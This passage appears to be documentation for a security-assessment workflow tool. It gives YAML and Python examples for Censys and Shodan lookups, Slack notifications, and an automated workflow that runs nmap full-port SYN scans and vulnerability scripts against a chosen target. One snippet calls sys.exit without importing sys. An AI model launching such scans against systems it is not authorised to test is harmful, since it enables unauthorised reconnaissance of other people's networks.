      - name: Query Censys
        script: |
          import requests
          from requests.auth import HTTPBasicAuth

          api_id = '${{ secrets.CENSYS_API_ID }}'
          api_secret = '${{ secrets.CENSYS_API_SECRET }}'

          if not api_id or not api_secret:
            print("Censys credentials not provided, skipping")
            sys.exit(0)

          response = requests.get(
            'https://search.censys.io/api/v2/hosts/search',
            auth=HTTPBasicAuth(api_id, api_secret),
            params={'q': '${{ inputs.target }}'}
          )

          print(response.json())
        language: python

  notify:
    needs: [passive_recon]
    hooks:
      on_success:
        script: |
          import requests
          import json

          webhook = '${{ secrets.SLACK_WEBHOOK }}'
          if webhook:
            requests.post(webhook, json={
              'text': f'✅ Recon completed for ${{ inputs.target }}'
            })
        language: python

docs.title: From Python
docs.text:
import asyncio
from pathlib import Path
from ofx.runner import WorkflowRunner, RunContext
from ofx.models.workflow import Workflow
import yaml

async def run_workflow():
    # Load workflow
    with open("workflow.yml") as f:
        workflow_data = yaml.safe_load(f)

    workflow = Workflow(**workflow_data)

    # Create context
    ctx = RunContext(
        inputs={"target": "192.168.1.1"},
        secrets={"API_KEY": "your_key"},
        output_path=Path("./output"),
    )

    # Run workflow
    runner = WorkflowRunner(workflow, ctx)
    result = await runner.run()

    print(f"Status: {result.status}")
    print(f"Output: {result.output}")

asyncio.run(run_workflow())

jobs:

docs.title: Complex Assessment Workflow
docs.text:
name: Comprehensive Security Assessment

inputs:
  target:
    description: Target network or host
    required: true

  depth:
    description: Assessment depth (1-5)
    required: false
    default: "3"

secrets:
  SHODAN_KEY:
    description: Shodan API key
    required: false

hooks:
  on_start:
    script: echo "Starting assessment of ${{ inputs.target }}"
    language: shell

  on_success:
    script: python notify_team.py --status success
    language: shell

jobs:
  passive_recon:
    steps:
      - name: OSINT gathering
        run: python osint.py --target ${{ inputs.target }}

      - name: Shodan lookup
        run: |
          if [ -n "${{ secrets.SHODAN_KEY }}" ]; then
            shodan host ${{ inputs.target }}
          fi

  active_scan:
    needs: [passive_recon]
    steps:
      - name: Port scan
        run: nmap -sS -sV -p- ${{ inputs.target }}

      - name: Vulnerability scan
        run: nmap --script vuln ${{ inputs.target }}

  analysis:
    needs: [active_scan]
    steps:
      - name: Analyze results
        run: python analyze.py --input ${{ ctx.output_path }}/scan.xml

      - name: Generate report
        run: python report.py --output ${{ ctx.output_path }}/report.pdf
